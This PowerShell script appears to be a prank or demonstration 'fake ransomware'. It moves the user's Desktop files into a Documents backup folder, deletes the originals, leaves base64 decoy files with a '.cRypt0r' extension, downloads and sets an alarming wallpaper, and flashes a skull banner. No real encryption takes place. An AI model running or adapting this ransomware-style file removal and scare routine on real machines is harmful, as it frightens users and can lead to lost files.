## IMPORTANT!! your data will NOT be altered. this is fake. check your Documents folder.

#Prepare system

    #Create folders
    $folder_base =  "$env:ProgramData\andreas6920\"
        mkdir $folder_base -ea ignore | Out-Null
    $wallpaper = "$folder_base\Wallpaper.jpg"
    $note = "$folder_base\READ_ME.txt"
  
    Invoke-WebRequest "https://github.com/Andreas6920/FakeRansomware/raw/main/resources/Background.jpg" -o $wallpaper


#File encryption
$targetdir = [Environment]::GetFolderPath("Desktop")
$backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
$files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
$fileextension = "cRypt0r"


#Copy folder structure
Robocopy $targetdir $backupdir /E /XF *.* | out-null

foreach ($file in $files)
{
#Ignore files bigger than 1GB
if(Get-ChildItem $file  | Where-Object {$_.Length -lt 1gb}){

#Copying file from targetdir to backupdir
$newdir = $file.Replace($targetdir,$backupdir)
Copy-Item $file $newdir
Remove-item $file

#Generate fake encrypted file
$encrypted = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($file))
$encryptedcontent = $encrypted
$encrypted = $encrypted.Substring($encrypted.Length - 16).replace("=","")
$encrypted = $encrypted + ".$fileextension"
$path = Join-path -path (Split-Path $file) -ChildPath $encrypted
new-item $path | out-null
Add-Content -Path $path -Value $encryptedcontent

}}

#Wallpaper
Function Set-WallPaper {

param (
[parameter(Mandatory=$True)]
# Provide path to image
[string]$Image,
# Provide wallpaper style that you would like applied
[parameter(Mandatory=$False)]
[ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
[string]$Style
)

$WallpaperStyle = Switch ($Style) {

"Fill" {"10"}
"Fit" {"6"}
"Stretch" {"2"}
"Tile" {"0"}
"Center" {"0"}
"Span" {"22"}

}

If($Style -eq "Tile") {

New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force

}
Else {

New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force

}

Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;

public class Params
{ 
[DllImport("User32.dll",CharSet=CharSet.Unicode)] 
public static extern int SystemParametersInfo (Int32 uAction, 
                                               Int32 uParam, 
                                               String lpvParam, 
                                               Int32 fuWinIni);
}
"@ 

$SPI_SETDESKWALLPAPER = 0x0014
$UpdateIniFile = 0x01
$SendChangeEvent = 0x02

$fWinIni = $UpdateIniFile -bor $SendChangeEvent

$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

Function Set-WallPaper {

param (
[parameter(Mandatory=$True)]
# Provide path to image
[string]$Image,
# Provide wallpaper style that you would like applied
[parameter(Mandatory=$False)]
[ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
[string]$Style
)

$WallpaperStyle = Switch ($Style) {

"Fill" {"10"}
"Fit" {"6"}
"Stretch" {"2"}
"Tile" {"0"}
"Center" {"0"}
"Span" {"22"}

}

If($Style -eq "Tile") {

New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force

}
Else {

New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force

}

Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;

public class Params
{ 
[DllImport("User32.dll",CharSet=CharSet.Unicode)] 
public static extern int SystemParametersInfo (Int32 uAction, 
                                               Int32 uParam, 
                                               String lpvParam, 
                                               Int32 fuWinIni);
}
"@ 

$SPI_SETDESKWALLPAPER = 0x0014
$UpdateIniFile = 0x01
$SendChangeEvent = 0x02

$fWinIni = $UpdateIniFile -bor $SendChangeEvent

$ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}


Set-WallPaper -Image $wallpaper -Style Stretch | Out-Null








write-host "your data is safe. check $backup_folder" -f Yellow

$intro = 
'
             uuuuuuu
         uu$$$$$$$$$$$uu 
      uu$$$$$$$$$$$$$$$$$uu
     u$$$$$$$$$$$$$$$$$$$$$u
    u$$$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$"   "$$$"   "$$$$$$u
   "$$$$"      u$u       $$$$"
    $$$u       u$u       u$$$
    $$$u      u$$$u      u$$$
     "$$$$uu$$$   $$$uu$$$$"
      "$$$$$$$"   "$$$$$$$"
        u$$$$$$$u$$$$$$$u
         u$"$"$"$"$"$"$u
uuu        $$u$ $ $ $ $u$$       uuu
u$$$$        $$$$$u$u$u$$$       u$$$$
$$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
"""      ""$$$$$$$$$$$uu ""$"""
       uuuu ""$$$$$$$$$$uuu
u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
$$$$$$$$$$""""           ""$$$$$$$$$$$"
"$$$$$"                      ""$$$$""
 $$$"                         $$$$"
                                                                                                                                                
'
1..99 | % {
    cls; ""; write-host $intro -ForegroundColor White; write "               RANSOMWARE";write "            MuHaHaHaHaHAHAHA!!!";""; Start-Sleep 1;}




